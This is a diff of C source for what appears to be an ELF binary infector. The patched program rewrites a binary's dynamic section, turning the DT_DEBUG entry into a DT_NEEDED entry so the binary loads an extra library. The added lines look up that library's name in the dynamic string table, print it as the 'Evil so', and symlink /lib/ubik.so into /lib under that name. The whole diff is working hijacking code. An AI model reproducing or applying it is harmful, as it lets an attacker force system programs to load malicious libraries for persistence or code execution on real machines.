@@ -11,6 +11,7 @@
 
 #define ELF32 1	
 #define ELF64 2
+
 // Get to the DT_DYNAMIC and find address
 	// Program Header
 	// PT_DYNAMIC segment
@@ -105,7 +106,7 @@ int main(int argc, char **argv){
 		exit(-1);
 	}
 	dt_debug_entry->d_tag = DT_NEEDED;
-	
+		
 
 	//Change Order symbols get resolved in.
 	Elf64_Xword dt_needed_val = dt_needed_entry->d_un.d_val;
@@ -116,7 +117,35 @@ int main(int argc, char **argv){
 
 	//Change value of new dt_needed entry
 	dt_needed_entry->d_un.d_val = dt_needed_val + 2; // dt_needed acts as the new dt_debug, since the d_ptr's were switched
+	
+	//Read dynamic string table
+	int dynamic_table_index;
+	for (int i = 1; i < elf_header->e_shnum; i++){
+		if(section_header_table[i].sh_type == SHT_DYNAMIC){
+			dynamic_table_index = i;
+		}
+	}
+	//Get name of evil shared object file 
+	Elf64_Word dynstr_table_index = section_header_table[dynamic_table_index].sh_link;
+	Elf64_Shdr* dynamic_string_table = &section_header_table[dynstr_table_index];
+	char *dynstr = (char *)(mem + dynamic_string_table->sh_offset);
+    char *fake_so = (char *) &dynstr[dt_needed_entry->d_un.d_val]; 
+	printf("Evil so: %s\n", fake_so); 	
 
+	//Create symbolic link to ubik.so
+	char fake_so_path[255] = "/lib/";
+	strcat(fake_so_path, fake_so);
+	printf("%s\n", fake_so_path);
+	
+	if (symlink("/lib/ubik.so", fake_so_path) == 0){
+		printf("symbolic link made");
+	}
+	
+	else {
+		perror("error making symbolic link");
+		return 1;
+	}
+	
 
 	if (msync(mem, f_stat.st_size, MS_SYNC) < 0){
 		perror("msync");
